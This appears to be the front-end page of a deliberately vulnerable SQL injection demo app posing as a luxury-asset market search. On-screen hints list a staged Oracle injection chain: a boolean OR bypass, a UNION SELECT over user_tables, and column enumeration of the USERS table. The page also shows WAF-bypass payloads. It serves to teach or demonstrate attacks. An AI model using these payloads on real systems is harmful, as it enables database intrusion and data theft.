"use client";

import { useState, useMemo, useRef } from "react";
import { createSingleFlight } from "@/lib/single-flight";
import { motion } from "framer-motion";
import { GlassCard } from "@/components/GlassCard";
import { columnPayloadForTable } from "@/lib/market-demo-payloads";
import {
  ATTACK1_WAF_BYPASS_BOOLEAN,
  ATTACK1_WAF_BYPASS_XML_HEX,
} from "@/lib/waf-bypass-demo-payloads";
import { wafMirrorUrl } from "@/lib/waf-query-mirror";

interface LuxItem {
  ID?: number; id?: number;
  NAME?: string; name?: string;
  PRICE?: number; price?: number;
  CATEGORY?: string; category?: string;
}

const DEMO_HINT_BOOLEAN = `Step 1 · Boolean bypass → ' OR '1'='1`;
const DEMO_HINT_SCHEMA =
  `Step 2 · Schema tables → ' UNION SELECT ROWNUM, table_name, 0, 'SCHEMA' FROM user_tables --`;
const DEMO_HINT_COLUMNS =
  `Step 3 · Table columns → ' AND 1=0 UNION SELECT ROWNUM, column_name || ' · ' || data_type, 0, 'COLUMNS' FROM user_tab_columns WHERE table_name = 'USERS' --`;

function itemCategory(item: LuxItem): string {
  return String(item.CATEGORY ?? item.category ?? "").toUpperCase();
}

function isSchemaRow(item: LuxItem): boolean {
  return itemCategory(item) === "SCHEMA";
}

function isColumnsRow(item: LuxItem): boolean {
  return itemCategory(item) === "COLUMNS";
}

function isMetadataRow(item: LuxItem): boolean {
  return isSchemaRow(item) || isColumnsRow(item);
}

export default function MarketExplorerPage() {
  const [query, setQuery] = useState("");
  const [results, setResults] = useState<LuxItem[]>([]);
  const [searched, setSearched] = useState(false);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const runSearch = useMemo(() => createSingleFlight(), []);
  /** Tracks {payload, firedAt} so the same injection can't fire more than once per 60 s. */
  const lastSearchRef = useRef<{ payload: string; at: number } | null>(null);

  const columnsLeaked = useMemo(
    () => results.some(isColumnsRow),
    [results],
  );

  const schemaLeaked = useMemo(
    () => results.some(isSchemaRow),
    [results],
  );

  const displayResults = useMemo(() => {
    if (columnsLeaked) return results.filter(isColumnsRow);
    if (schemaLeaked) return results.filter(isSchemaRow);
    return results;
  }, [results, columnsLeaked, schemaLeaked]);

  function pivotToColumnDiscovery(item: LuxItem) {
    const tableName = String(item.NAME ?? item.name ?? "").trim();
    if (!tableName) return;
    setQuery(columnPayloadForTable(tableName));
    setError(null);
  }

  async function search() {
    const payload = query.trim();
    if (!payload) return;

    const now = Date.now();
    const last = lastSearchRef.current;
    if (last && last.payload === payload && now - last.at < 60_000) {
      return; // same payload within cooldown — skip to avoid duplicate Oracle violations
    }
    lastSearchRef.current = { payload, at: now };

    setError(null);
    const ran = await runSearch(async () => {
      setLoading(true);
      setSearched(true);
      try {
        const res = await fetch(wafMirrorUrl("/api/market/search", { q: query }), {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ q: query }),
        });
        const data = await res.json() as { rows?: LuxItem[]; error?: string };
        if (data.error) {
          setError(data.error);
          setResults([]);
        } else {
          setResults(data.rows ?? []);
        }
      } catch {
        setError("Request failed");
      } finally {
        setLoading(false);
      }
    });
    if (ran === undefined) return;
  }

  return (
    <div className="mx-auto max-w-5xl px-6 py-8">
      {/* Header */}
      <div className="mb-8">
        <h1 className="text-3xl font-black gold-gradient mb-2">Market Explorer</h1>
        <p className="text-slate-400 text-sm">
          Discover exclusive luxury assets, collectibles, and alternative investments.
          Search by name, category, or asset ticker.
        </p>
      </div>

      {/* Search card */}
      <GlassCard gold className="mb-8">
        <label className="block text-xs uppercase tracking-wider text-slate-500 mb-2">
          Lux-Asset / Ticker Universal Search
        </label>
        <div className="flex gap-3">
          <input
            value={query}
            onChange={(e) => setQuery(e.target.value)}
            onKeyDown={(e) => e.key === "Enter" && void search()}
            placeholder="Enter asset name, ticker or category…"
            className="flex-1 rounded-lg px-4 py-2.5 text-sm text-slate-200 placeholder:text-slate-600 outline-none font-mono"
            style={{
              background: "rgba(15,23,42,0.8)",
              border: "1px solid rgba(244,201,93,0.2)",
            }}
          />
          <button
            onClick={() => void search()}
            disabled={loading}
            className="gold-btn rounded-lg px-6 py-2.5 text-sm disabled:opacity-50"
          >
            {loading ? "Searching…" : "Search"}
          </button>
        </div>
        <p className="mt-2 text-[10px] text-slate-600 font-mono">{DEMO_HINT_BOOLEAN}</p>
        <p className="mt-1 text-[10px] text-slate-600 font-mono">{DEMO_HINT_SCHEMA}</p>
        <p className="mt-1 text-[10px] text-slate-600 font-mono">{DEMO_HINT_COLUMNS}</p>
        <p className="mt-2 break-all text-[10px] text-slate-600 font-mono">
          WAF bypass (comment OR): {ATTACK1_WAF_BYPASS_BOOLEAN}
        </p>
        <p className="mt-1 break-all text-[10px] text-slate-600 font-mono">
          WAF bypass (XML/hex): {ATTACK1_WAF_BYPASS_XML_HEX}
        </p>
      </GlassCard>

      {/* Results */}
      {error && (
        <GlassCard className="mb-4 border-[rgba(244,63,94,0.3)]">
          <p className="text-sm text-[#f43f5e] font-mono">{error}</p>
        </GlassCard>
      )}

      {searched && !error && (
        <div>
          {columnsLeaked && (
            <div
              className="mb-4 rounded-lg px-4 py-2 text-xs font-semibold text-[#f43f5e]"
              style={{
                background: "rgba(244,63,94,0.08)",
                border: "1px solid rgba(244,63,94,0.25)",
              }}
            >
              Column schema exposed via UNION injection — data dictionary columns leaked
            </div>
          )}
          {schemaLeaked && !columnsLeaked && (
            <div
              className="mb-4 rounded-lg px-4 py-2 text-xs font-semibold text-[#f43f5e]"
              style={{
                background: "rgba(244,63,94,0.08)",
                border: "1px solid rgba(244,63,94,0.25)",
              }}
            >
              Schema metadata exposed via UNION injection — Oracle table names leaked
            </div>
          )}
          {schemaLeaked && !columnsLeaked && (
            <p className="mb-3 text-[10px] text-slate-500">
              Click a table card to load step 3 (column enumeration), then Search.
            </p>
          )}
          <div className="flex items-center justify-between mb-4">
            <h2 className="text-sm font-semibold text-slate-400">
              {displayResults.length} result{displayResults.length !== 1 ? "s" : ""} found
            </h2>
            {results.length > 0 && !schemaLeaked && !columnsLeaked && (
              <span className="text-xs text-slate-600">
                Market data — live feed
              </span>
            )}
            {schemaLeaked && !columnsLeaked && (
              <span className="text-xs font-mono text-[#22d3ee]">
                Data dictionary — user_tables
              </span>
            )}
            {columnsLeaked && (
              <span className="text-xs font-mono text-[#a78bfa]">
                Data dictionary — user_tab_columns
              </span>
            )}
          </div>

          {displayResults.length === 0 ? (
            <GlassCard>
              <p className="text-sm text-slate-500 text-center py-4">No assets matched your search.</p>
            </GlassCard>
          ) : (
            <div className="grid gap-4 sm:grid-cols-2 lg:grid-cols-3">
              {displayResults.map((item, i) => {
                const schema = isSchemaRow(item);
                const columns = isColumnsRow(item);
                const metadata = isMetadataRow(item);
                const name = String(item.NAME ?? item.name ?? "—");
                const price = Number(item.PRICE ?? item.price ?? 0);
                const cat = String(item.CATEGORY ?? item.category ?? "—");

                return (
                  <motion.div
                    key={i}
                    initial={{ opacity: 0, y: 10 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: i * 0.05 }}
                  >
                    <GlassCard
                      gold={!metadata}
                      className={`h-full ${schema ? "cursor-pointer transition hover:scale-[1.02]" : ""}`}
                      style={
                        schema
                          ? { border: "1px solid rgba(34,211,238,0.25)" }
                          : columns
                            ? { border: "1px solid rgba(167,139,250,0.3)" }
                            : undefined
                      }
                      onClick={schema ? () => pivotToColumnDiscovery(item) : undefined}
                    >
                      <div className="flex items-start justify-between mb-3">
                        <div
                          className="h-10 w-10 rounded-lg flex items-center justify-center text-lg"
                          style={{
                            background: columns
                              ? "rgba(167,139,250,0.1)"
                              : schema
                                ? "rgba(34,211,238,0.1)"
                                : "rgba(244,201,93,0.1)",
                            border: columns
                              ? "1px solid rgba(167,139,250,0.25)"
                              : schema
                                ? "1px solid rgba(34,211,238,0.2)"
                                : "1px solid rgba(244,201,93,0.2)",
                          }}
                        >
                          {columns ? "⫴" : schema ? "▦" : "◎"}
                        </div>
                        <span
                          className="text-[10px] uppercase tracking-wider px-2 py-0.5 rounded-full"
                          style={{
                            background: columns
                              ? "rgba(167,139,250,0.1)"
                              : "rgba(34,211,238,0.08)",
                            color: columns ? "#a78bfa" : "#22d3ee",
                            border: columns
                              ? "1px solid rgba(167,139,250,0.25)"
                              : "1px solid rgba(34,211,238,0.2)",
                          }}
                        >
                          {cat}
                        </span>
                      </div>
                      <p
                        className="font-semibold mb-1 font-mono text-sm"
                        style={{ color: metadata ? "#e2e8f0" : undefined }}
                      >
                        {name}
                      </p>
                      {schema && (
                        <p className="mb-1 text-[10px] text-[#22d3ee]">
                          Click for step 3 → columns
                        </p>
                      )}
                      <p
                        className={`text-xl font-black ${metadata ? "text-slate-500" : "gold-text"}`}
                      >
                        {metadata ? "—" : `$${price.toLocaleString()}`}
                      </p>
                    </GlassCard>
                  </motion.div>
                );
              })}
            </div>
          )}
        </div>
      )}
    </div>
  );
}
